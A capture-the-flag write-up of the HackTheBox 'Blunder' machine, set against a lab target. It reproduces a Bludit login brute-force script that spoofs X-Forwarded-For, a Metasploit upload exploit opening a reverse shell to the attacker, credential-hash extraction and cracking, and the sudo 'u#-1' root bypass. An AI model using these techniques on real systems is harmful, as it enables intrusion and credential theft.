---
title: "HackTheBox Machine - Blunder"
classes: wide
header:
  teaser: /assets/images/htb-frame.png
header:
  teaser: /assets/images/htb-frame.png
search: false
categories: 
  - HackTheBox Machine
toc: true
toc_label: "Contents"
last_modified_at: 2020-06-01T15:58:26+08:00
---

![HTB Blunder](/assets/images/htb-machine-blunder/featured-image.png)

### Network Scanning

For network scanning, nmap is a the best tool for grabing information from the target. Here, we use command `nmap -sC -sV -T4 -A -oN blunder.nmap 10.10.10.191` and the outputs are shown below

```
# Nmap 7.80 scan initiated Mon Jun  1 01:42:02 2020 as: nmap -sC -sV -T4 -A -oN blunder.nmap 10.10.10.191
Nmap scan report for 10.10.10.191
Host is up (0.33s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Ubiquiti AirOS 5.5.9 (90%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.0 - 3.2 (89%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (89%), Linux 3.7 (89%), Netgear RAIDiator 4.2.21 (Linux 2.6.37) (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   372.33 ms 10.10.14.1
2   372.34 ms 10.10.10.191

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  1 01:42:46 2020 -- 1 IP address (1 host up) scanned in 44.51 seconds
```
here, we got some information about an opened port is port 80 for web service, and here below are headers shown

```
http-generator: Blunder
http-server-header: Apache/2.4.41 (Ubuntu)
http-title: Blunder | A blunder of interesting facts
```
### Enumeration

port 80, web access
![01](/assets/images/htb-machine-blunder/01.png)
for fuzzing directory we use ffuf.
```
╭─twseptian@twsterlab ~/lab/HTB/boxes/blunder 
╰─$ ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u http://10.10.10.191/FUZZ                

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.191/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
0                       [Status: 200, Size: 9394, Words: 939, Lines: 250]
LICENSE                 [Status: 200, Size: 1083, Words: 155, Lines: 22]
about                   [Status: 200, Size: 3280, Words: 225, Lines: 106]
admin                   [Status: 301, Size: 0, Words: 1, Lines: 1]
cgi-bin/                [Status: 301, Size: 0, Words: 1, Lines: 1]
empty                   [Status: 200, Size: 3466, Words: 209, Lines: 109]
robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
usb                     [Status: 200, Size: 3959, Words: 304, Lines: 111]
:: Progress: [20469/20469] :: Job [1/1] :: 58 req/sec :: Duration: [0:05:50] :: Errors: 0 ::

```
http://10.10.10.191/0
![02](/assets/images/htb-machine-blunder/02.png)
http://10.10.10.191/LISENCE
![03](/assets/images/htb-machine-blunder/03.png)
http://10.10.10.191/about
![04](/assets/images/htb-machine-blunder/04.png)
http://10.10.10.191/admin
![05](/assets/images/htb-machine-blunder/05.png)
http://10.10.10.191/cgi-bin/
![06](/assets/images/htb-machine-blunder/06.png)
http://10.10.10.191/empty
![07](/assets/images/htb-machine-blunder/07.png)
http://10.10.10.191/robots.txt
![08](/assets/images/htb-machine-blunder/08.png)
http://10.10.10.191/server-status
![09](/assets/images/htb-machine-blunder/09.png)
http://10.10.10.191/usb
![10](/assets/images/htb-machine-blunder/10.png)
file extension fuzzing, here i made simple extension list, include are php,txt,html and js

```
╭─twseptian@twsterlab ~/lab/HTB/boxes/blunder 
╰─$ ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -w /twseptian/lab/HTB/boxes/blunder/extension.txt:EXT -u http://10.10.10.191/FUZZ.EXT -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.191/FUZZ.EXT
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Wordlist         : EXT: /twseptian/lab/HTB/boxes/blunder/extension.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

[Status: 200, Size: 22, Words: 3, Lines: 2]
    * EXT: txt
    * FUZZ: robots

[Status: 200, Size: 118, Words: 20, Lines: 5]
    * FUZZ: todo
    * EXT: txt

[Status: 200, Size: 30, Words: 5, Lines: 1]
    * FUZZ: install
    * EXT: php

:: Progress: [81876/81876] :: Job [1/1] :: 46 req/sec :: Duration: [0:29:04] :: Errors: 3 ::
```
in http://10.10.10.191/todo.txt , we got some information about credential account from the website, the username is fergus.
![11](/assets/images/htb-machine-blunder/11.png)
http://10.10.10.191/install.php are showing the information about “bludit is already installed”, it was similar like admin page (http://10.10.10.191/admin)
![12](/assets/images/htb-machine-blunder/12.png)
let's search information about bludit's exploit using searchploit and google information
- searchploit
```
╭─twseptian@twsterlab ~/lab/HTB/boxes/blunder 
╰─$ searchsploit bludit
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Bludit - Directory Traversal Image File Upload (Metasploit)                                                                                  | php/remote/47699.rb
bludit Pages Editor 3.0.0 - Arbitrary File Upload                                                                                            | php/webapps/46060.txt
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
╭─twseptian@twsterlab ~/lab/HTB/boxes/blunder 
╰─$ 
```
metasploit provides module for bludit, the information about vulnerability is Directory Traversal Image File Upload. This below, the description from metasploit 

- Bludit Directory Traversal Image File Upload Vulnerability - https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec
![13](/assets/images/htb-machine-blunder/13.png)

```
msf5 > use exploit/linux/http/bludit_upload_images_exec 
msf5 exploit(linux/http/bludit_upload_images_exec) > show options 

Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS                   yes       The password for Bludit
   BLUDITUSER                   yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2


msf5 exploit(linux/http/bludit_upload_images_exec) > 
```

in the module exploit/linux/http/bludit_upload_images_exec we need some of options required, such as
```
BLUDITPASS - The password for Bludit
BLUDITUSER - The username for Bludit
```
and for RHOST is 10.10.10.191. next step is find the password for bludit administrator. we found the website explains about Bludit Brute Force Mitigation Bypass (https://rastating.github.io/bludit-brute-force-mitigation-bypass/). 

The proof of concept show 
```python
# https://rastating.github.io/bludit-brute-force-mitigation-bypass/
#!/usr/bin/env python3
import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = []

# Generate 50 incorrect passwords
##for i in range(50):
##   wordlist.append('Password{i}'.format(i = i))
with open("/usr/share/wordlists/rockyou.txt", "r") as f:
    for line in f.readlines():
        wordlist.append(str(line).strip("\n"))
# Add the correct password to the end of the list
##wordlist.append('adminadmin')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```
In this case, we run the brute force attack using rockyou.txt wordlist. When the brute force attack was running,no username and password were found. i try to use cewl (https://tools.kali.org/password-attacks/cewl and for some of tutorial http://stuffjasondoes.com/2018/07/18/creating-custom-wordlists-for-targeted-attacks-with-cewl/) to generate custom password list from the website.
```
╭─twseptian@twsterlab ~/lab/HTB/boxes/blunder 
╰─$ cewl -d 3 -m 4 -w wordlist.txt http://10.10.10.191
```
and try to run again python brute force scrip, and we got some of output
```
╭─twseptian@twsterlab ~/lab/HTB/boxes/blunder 
╰─$ python2.7 bypass-password-bludit.py               
[*] Trying: Load
....
[*] Trying: fictional
[*] Trying: character
[*] Trying: RolandDeschain
()
SUCCESS: Password found!
Use fergus:RolandDeschain to login.
()
```
![14](/assets/images/htb-machine-blunder/14.png)

let's try input the username with fergus and password is `RolandDeschain`
![15](/assets/images/htb-machine-blunder/15.png)
back again to metasploit
```
msf5 > use exploit/linux/http/bludit_upload_images_exec
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
BLUDITUSER => fergus
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
BLUDITPASS => RolandDeschain
msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOST 10.10.10.191
RHOST => 10.10.10.191
msf5 exploit(linux/http/bludit_upload_images_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.31:4444 
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading hvgsNsHoEn.png...
[*] Uploading .htaccess...
[*] Executing hvgsNsHoEn.png...
[*] Sending stage (38288 bytes) to 10.10.10.191
[*] Meterpreter session 1 opened (10.10.14.31:4444 -> 10.10.10.191:40924) at 2020-06-01 20:44:27 +0700
[+] Deleted .htaccess

meterpreter > 
meterpreter > shell
Process 22117 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c "import pty;pty.spawn('/bin/bash')"
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ 
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$
```
let's see /etc/passwd
```
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:106:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:107:114::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:108:115:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:109:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:110:116:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:111:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:113:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
kernoops:x:114:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:116:122::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:117:123:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
whoopsie:x:118:124::/nonexistent:/bin/false
colord:x:119:125:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:120:7:HPLIP system user,,,:/var/run/hplip:/bin/false
geoclue:x:121:126::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:122:127:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:123:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:124:129:Gnome Display Manager:/var/lib/gdm3:/bin/false
shaun:x:1000:1000:blunder,,,:/home/shaun:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash
temp:x:1002:1002:,,,:/home/temp:/bin/bash
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$
```
let's see hugo directory
```
www-data@blunder:/home/hugo$ ls -la
ls -la
total 80
drwxr-xr-x 16 hugo hugo 4096 May 26 09:29 .
drwxr-xr-x  4 root root 4096 Apr 27 14:31 ..
lrwxrwxrwx  1 root root    9 Apr 28 12:13 .bash_history -> /dev/null
-rw-r--r--  1 hugo hugo  220 Nov 28  2019 .bash_logout
-rw-r--r--  1 hugo hugo 3771 Nov 28  2019 .bashrc
drwx------ 13 hugo hugo 4096 Apr 27 14:29 .cache
drwx------ 11 hugo hugo 4096 Nov 28  2019 .config
drwx------  3 hugo hugo 4096 Apr 27 14:30 .gnupg
drwxrwxr-x  3 hugo hugo 4096 Nov 28  2019 .local
drwx------  5 hugo hugo 4096 Apr 27 14:29 .mozilla
-rw-r--r--  1 hugo hugo  807 Nov 28  2019 .profile
drwx------  2 hugo hugo 4096 Apr 27 14:30 .ssh
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Desktop
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Documents
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Downloads
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Music
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Pictures
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Public
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Templates
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Videos
-r--------  1 hugo hugo   33 May 28 10:34 user.txt
www-data@blunder:/home/hugo$ 
```
we can't see user.txt because owner for file is hugo
```
www-data@blunder:/home/hugo$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@blunder:/home/hugo$ 
```

### Previlege Escalation - user

go back to the www-data directory
```
www-data@blunder:/home/hugo$ cd /var/www/bludit-3.9.2/bl-content/
cd /var/www/bludit-3.9.2/bl-content/
www-data@blunder:/var/www/bludit-3.9.2/bl-content$ ls -la
ls -la
total 28
drwxr-xr-x  7 www-data www-data 4096 Nov 27  2019 .
drwxrwxr-x  8 www-data www-data 4096 Apr 28 12:18 ..
drwxr-xr-x  3 www-data www-data 4096 May 31 01:37 databases
drwxr-xr-x 11 www-data www-data 4096 May 30 22:38 pages
drwxr-xr-x  3 www-data www-data 4096 Jun  1 14:59 tmp
drwxr-xr-x  5 www-data www-data 4096 Nov 27  2019 uploads
drwxr-xr-x  4 www-data www-data 4096 Nov 27  2019 workspaces
www-data@blunder:/var/www/bludit-3.9.2/bl-content$ cd databases
cd databases
www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ ls -la
ls -la
total 180
drwxr-xr-x 3 www-data www-data   4096 May 31 01:37 .
drwxr-xr-x 7 www-data www-data   4096 Nov 27  2019 ..
-rw-r--r-- 1 www-data www-data    438 May 30 22:38 categories.php
-rw-r--r-- 1 www-data www-data   5110 May 30 22:38 pages.php
drwxr-xr-x 6 www-data www-data   4096 Nov 27  2019 plugins
-rw-r--r-- 1 www-data www-data 143312 Jun  1 14:53 security.php
-rw-r--r-- 1 www-data www-data      0 May 31 01:37 shell
-rw-r--r-- 1 www-data www-data   1319 May 19 11:28 site.php
-rw-r--r-- 1 www-data www-data   2357 May 30 22:38 syslog.php
-rw-r--r-- 1 www-data www-data     52 May 30 22:38 tags.php
-rw-r--r-- 1 www-data www-data   1300 May 30 21:27 users.php
www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cat users.php
cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "a6289b779712c5e3b86ffcd2d0449734",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
}www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ 
```
we found username admin and author and hash password
```
username           : admin
password hash   : bfcc887f62e36ea019e3295aafb8a3885966e265"
```
and for hugo we can try to find to other directory
```
www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cd /var/www
www-data@blunder:/var/www$ ls -la
ls -la
total 20
drwxr-xr-x  5 root     root     4096 Nov 28  2019 .
drwxr-xr-x 15 root     root     4096 Nov 27  2019 ..
drwxr-xr-x  8 www-data www-data 4096 May 19 15:13 bludit-3.10.0a
drwxrwxr-x  8 www-data www-data 4096 Apr 28 12:18 bludit-3.9.2
drwxr-xr-x  2 root     root     4096 Nov 28  2019 html
www-data@blunder:/var/www$ cd bludit-3.10.0a/bl-content/databases
cd bludit-3.10.0a/bl-content/databases
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ ls -la
ls -la
total 80
drwxr-xr-x 3 www-data www-data  4096 May 19 10:10 .
drwxr-xr-x 7 www-data www-data  4096 May 19 10:03 ..
-rw-r--r-- 1 www-data www-data   438 May 19 10:03 categories.php
-rw-r--r-- 1 www-data www-data  3437 May 19 10:03 pages.php
drwxr-xr-x 6 www-data www-data  4096 May 19 10:03 plugins
-rw-r--r-- 1 www-data www-data 42844 May 19 10:03 security.php
-rw-r--r-- 1 www-data www-data  1319 May 19 10:03 site.php
-rw-r--r-- 1 www-data www-data  2276 May 19 10:03 syslog.php
-rw-r--r-- 1 www-data www-data    52 May 19 10:03 tags.php
-rw-r--r-- 1 www-data www-data   597 May 19 10:10 users.php
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ 
```
and for username hugo
```
username: hugo
password hash : faca404fd5c0a31cf1897b823c695c85cffeb98d
```
we try to check the type of hash is SHA-1
```
╭─twseptian@twsterlab ~ 
╰─$ hash-identifier faca404fd5c0a31cf1897b823c695c85cffeb98d
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```
i try crack this password using crackstation.net
![16](/assets/images/htb-machine-blunder/16.png)
okay, we got password for hugo and the password is Password120
```
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su - hugo
su - hugo
Password: Password120

hugo@blunder:~$ id     
id
uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)
hugo@blunder:~$ pwd
pwd
/home/hugo
hugo@blunder:~$ ls -la
ls -la
total 80
drwxr-xr-x 16 hugo hugo 4096 May 26 09:29 .
drwxr-xr-x  4 root root 4096 Apr 27 14:31 ..
lrwxrwxrwx  1 root root    9 Apr 28 12:13 .bash_history -> /dev/null
-rw-r--r--  1 hugo hugo  220 Nov 28  2019 .bash_logout
-rw-r--r--  1 hugo hugo 3771 Nov 28  2019 .bashrc
drwx------ 13 hugo hugo 4096 Apr 27 14:29 .cache
drwx------ 11 hugo hugo 4096 Nov 28  2019 .config
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Desktop
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Documents
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Downloads
drwx------  3 hugo hugo 4096 Apr 27 14:30 .gnupg
drwxrwxr-x  3 hugo hugo 4096 Nov 28  2019 .local
drwx------  5 hugo hugo 4096 Apr 27 14:29 .mozilla
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Music
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Pictures
-rw-r--r--  1 hugo hugo  807 Nov 28  2019 .profile
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Public
drwx------  2 hugo hugo 4096 Apr 27 14:30 .ssh
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Templates
-r--------  1 hugo hugo   33 May 28 10:34 user.txt
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Videos
hugo@blunder:~$ cat user.txt
cat user.txt
2d9085926ee41c2d26f8a4b6c8514939
hugo@blunder:~$ 
```
### Privilege Escalation - root

let's find how to find privesc root
```
hugo@blunder:~$ sudo -l 
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
hugo@blunder:~$ 
```
let's check sudo version
```
hugo@blunder:~$ sudo --version
sudo --version
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
hugo@blunder:~$ /bin/bash --version
/bin/bash --version
GNU bash, version 5.0.3(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2019 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```
we found sudo version is exploitable sudo 1.8.27 - Security Bypass - https://www.exploit-db.com/exploits/47502
```
hugo@blunder:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
Password: Password120

root@blunder:/home/hugo# cd /root
root@blunder:/root# cat root.txt               
cat root.txt                                                                                            
e4baf3bc79ec7c06593780e0cdba409d                                                                        
root@blunder:/root#  
```
### References
- ffuf https://github.com/ffuf/ffuf
- cewl https://tools.kali.org/password-attacks/cewl
- Creating Custom Wordlists for Targeted Attacks with CeWL http://stuffjasondoes.com/2018/07/18/creating-custom-wordlists-for-targeted-attacks-with-cewl/
- sudo 1.8.27 - Security Bypass - https://www.exploit-db.com/exploits/47502